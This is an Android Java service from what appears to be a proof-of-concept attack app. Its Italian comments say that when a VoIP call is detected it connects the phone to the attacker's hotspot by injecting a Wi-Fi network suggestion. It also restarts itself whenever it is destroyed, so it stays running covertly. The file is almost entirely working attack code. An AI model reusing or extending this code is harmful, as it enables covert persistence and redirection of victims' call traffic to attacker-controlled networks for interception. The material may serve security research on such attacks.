package com.example.provaservice;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.net.wifi.WifiNetworkSuggestion;
import android.os.IBinder;
import androidx.annotation.Nullable;
import java.util.ArrayList;
import java.util.List;

/**
 * Classe Service che rimane in esecuzione grazie al metodo {@link Alfred#restartService()} e
 * si occupa di individuare una chiamata VoIP grazie al metodo {@link MainActivity#isVoip(Context)}
 * @author Eugenio De Simone
 */
public class Alfred extends Service {

    Intent broadcastIntent;

    @Override
    /**
     * Metodo che definisce le operazioni che esegue il Service.
     * {@linktourl https://developer.android.com/reference/android/app/Service#onStartCommand(android.content.Intent,%20int,%20int)}.
     */
    public int onStartCommand(Intent intent, int flags, int startId) {

        if(MainActivity.isVoip(getApplicationContext())){
            //VoIP Detected
            hotspotConfig();
        }else{
            //VoIP Undetected
        }
        return START_STICKY;
    }

    @Nullable
    @Override
    /**
     * Metodo per effettuare il bind al Service
     * {@linktourl https://developer.android.com/reference/android/app/Service#onBind(android.content.Intent)}.
     */
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Metodo che si occupa della connessione all'hotspot  dell'attaccante.
     */
    private void hotspotConfig(){
        final WifiManager wifiManager =
                (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        final WifiNetworkSuggestion suggestion2 =
                new WifiNetworkSuggestion.Builder()
                        .setSsid("TEST1239")
                        .setWpa2Passphrase("test1239")
                        .build();

        final List<WifiNetworkSuggestion> suggestionsList =
                new ArrayList<WifiNetworkSuggestion>();
        suggestionsList.add(suggestion2);

        final int status = wifiManager.addNetworkSuggestions(suggestionsList);
        if (status != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
            //error
        }
    }

    /**
     * Metodo che si occupa del riavvio del Service mediante l'invio di un messaggio
     * al BroadcastReceiver {@link Restarter}
     */
    private void restartService(){
        broadcastIntent = new Intent();
        broadcastIntent.setAction("restartService");
        broadcastIntent.setClass(this, Restarter.class);
        this.sendBroadcast(broadcastIntent);
    }
    @Override
    /**
     * Metodo chiamato in fase di distruzione del Service, si occupa inoltre
     * del riavvio del Service mediante {@link #restartService()}
     */
    public void onDestroy() {
        super.onDestroy();
        restartService();
    }

}
